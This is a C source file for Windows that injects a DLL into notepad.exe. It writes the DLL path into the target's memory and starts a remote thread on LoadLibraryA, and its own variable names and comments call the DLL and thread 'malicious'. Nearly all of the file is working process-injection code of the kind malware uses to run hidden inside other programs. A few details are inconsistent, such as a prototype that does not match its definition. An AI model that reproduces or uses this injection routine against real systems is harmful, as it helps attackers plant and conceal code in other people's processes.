#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <TlHelp32.h>

#pragma comment(lib, "psapi.lib")


//function prototypes
void PrintModules();
DWORD FindProcessId(const WCHAR* processname);
void DllInjection(char dll_path[], DWORD dll_path_size, HANDLE target_process_handle); 



// Printing System error's
void Error(const char* msg)
{
	printf("\n### ERROR ###  %s  (%d)", msg, GetLastError());
	exit(EXIT_FAILURE);
}


int main()
{
	char malicious_dll_path[] = "The DLL path, Example:  C:/Windows/PEB.dll";
	DWORD dll_path_size = sizeof(malicious_dll_path);

	DWORD target_process_pid = FindProcessId(L"notepad.exe");
	if (!target_process_pid)
		printf("Failed to find the PID.... No such process most likely ");

	HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_pid);
	if (target_process_handle == NULL)
		Error("openProcess failed.....");

	DllInjection(malicious_dll_path, dll_path_size, target_process_handle);
	
	Sleep(2000);
	PrintModules(target_process_handle);
	getchar();
}


/// <summary>
/// Prints all the 
/// </summary>
void PrintModules(HANDLE target_process_handle)
{
	HMODULE array_of_module_handles[6400];
	DWORD size_of_array_needed_to_store_all_bytes;
	unsigned int i;

	// Get a list of all the modules in this process.
	int result = EnumProcessModulesEx(target_process_handle, array_of_module_handles, sizeof(array_of_module_handles), &size_of_array_needed_to_store_all_bytes, LIST_MODULES_ALL);
	if (!result)
		Error("EnumProcessModulesEx failed");

	// Print all the DLL's we in the Process
	WCHAR module_full_path[MAX_PATH];
	for (i = 0; i < (size_of_array_needed_to_store_all_bytes / sizeof(HMODULE)); i++)
	{

		// Get the full path to the module's file.
		result = GetModuleFileNameEx(target_process_handle, array_of_module_handles[i], module_full_path, _countof(module_full_path));
		if (!result)
			Error("GetModuleFileNameEx failed");

		wprintf(L"\n[+] Module:  %s", module_full_path);
	}
}




/// <summary>
/// Find the PID of a specified process.
/// </summary>
DWORD FindProcessId(const WCHAR* processname)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32 = { sizeof(pe32) };  //Describes 1 process from a list of processes given by a screenshot
	DWORD result = 0;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //SnapShot of all processes in the system
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		Error("CreateToolhelp32Snapshot failed");
	}

	if (!Process32First(hProcessSnap, &pe32))	//Checks if the first entry in the snapshoted processes list is valid. If not the list isn't valid
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		Error("!!! Failed to gather information on system processes! \n");
	}

	do
	{
		if (0 == wcscmp(processname, pe32.szExeFile))	//For each process in the snapshot, compare the name against the name we want.
		{
			result = pe32.th32ProcessID;	//Get the process PID
			CloseHandle(hProcessSnap);

			return result;
		}
	} while (Process32Next(hProcessSnap, &pe32));	//Iterate to the next process in the snapshot
	return 0;
}


/// <summary>   
/// Simple Dll injection
/// </summary>
void DllInjection(char dll_path[], DWORD dll_path_size ,HANDLE target_process_handle)
{
	void* base_address_of_allocated_memory_in_target_process = VirtualAllocEx(target_process_handle, NULL, dll_path_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!base_address_of_allocated_memory_in_target_process)
		Error("VirtualAllocEx failed");

	size_t bytes_written = 0;
	int result = WriteProcessMemory(target_process_handle, base_address_of_allocated_memory_in_target_process, dll_path, dll_path_size, &bytes_written);
	if (!result || bytes_written != dll_path_size)
		Error("WriteProcessMemory failed");

	PTHREAD_START_ROUTINE LoadLibraryA_address = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");
	if (!LoadLibraryA_address)
		Error("GetProcAddress & GetModuleHandleA failed");

	DWORD remote_thread_id;
	HANDLE handle_to_thread_in_target_process = CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA_address,
		base_address_of_allocated_memory_in_target_process, CREATE_SUSPENDED, &remote_thread_id);
	if (!handle_to_thread_in_target_process)
		Error("CreateRemoteThread failed");

	DWORD previous_protection;
	result = VirtualProtectEx(target_process_handle, base_address_of_allocated_memory_in_target_process, dll_path_size, PAGE_EXECUTE, &previous_protection);
	if (!result)
		Error("VirtualProtectEx failed");

	result = ResumeThread(handle_to_thread_in_target_process);
	if (result <= 0)
		Error("ResumeThread failed");
}


// Allocate memory in the dst process
// Write the DLL path in the virtual address of the target process
// Get the address of the function LoadLibraryA() which will always be the same in proccesses from the same architecture 
// Create a thread in the target process
// Change the protection of the memory page from READWRITE to PAGE_EXECUTE
// Resume the malicious thread in the target process
